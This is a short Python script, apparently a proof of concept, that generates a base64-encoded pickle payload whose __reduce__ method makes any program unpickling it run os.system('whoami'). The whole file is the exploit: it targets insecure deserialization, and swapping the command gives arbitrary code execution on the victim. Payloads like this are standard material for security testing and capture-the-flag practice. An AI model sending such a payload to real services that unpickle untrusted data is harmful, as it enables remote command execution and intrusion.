import pickle
import base64
import os

class EVIL:
    def __reduce__(self):
        return (os.system, ("whoami",))


print(base64.b64encode(pickle.dumps(EVIL())))